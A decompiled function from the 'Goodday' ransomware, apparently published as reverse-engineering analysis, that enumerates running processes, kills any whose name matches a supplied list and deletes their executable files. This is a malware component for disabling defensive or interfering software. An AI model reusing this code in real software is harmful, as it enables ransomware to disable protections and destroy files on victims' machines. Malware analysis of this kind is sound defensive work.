////////////////////////////////////////////////////////////
// Goodday Ransomware
// https://www.shadowstackre.com/analysis/Goodday
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////
BOOL __cdecl CheckIfProcessRunning(int a1, int a2)
{
  WCHAR Filename[260]; // [esp+0h] [ebp-444h] BYREF
  PROCESSENTRY32W pe; // [esp+208h] [ebp-23Ch] BYREF
  BOOL i; // [esp+434h] [ebp-10h]
  HANDLE hSnapshot; // [esp+438h] [ebp-Ch]
  HANDLE hProcess; // [esp+43Ch] [ebp-8h]
  int j; // [esp+440h] [ebp-4h]

  hSnapshot = CreateToolhelp32Snapshot(0xFu, 0);
  pe.dwSize = 556;
  for ( i = Process32FirstW(hSnapshot, &pe); i; i = Process32NextW(hSnapshot, &pe) )
  {
    for ( j = 0; j < a1; ++j )
    {
      if ( !lstrcmpiW(*(LPCWSTR *)(a2 + 4 * j), pe.szExeFile) )
      {
        hProcess = OpenProcess(0x411u, 0, pe.th32ProcessID);
        if ( hProcess )
        {
          TerminateProcess(hProcess, 9u);
          sub_4175C0(Filename, 0x104u);
          if ( K32GetModuleFileNameExW(hProcess, 0, Filename, 0x104u) )
          {
            DeleteFileW(Filename);
            sub_4175C0(Filename, 0x104u);
          }
          CloseHandle(hProcess);
        }
        break;
      }
    }
  }
  return CloseHandle(hSnapshot);
}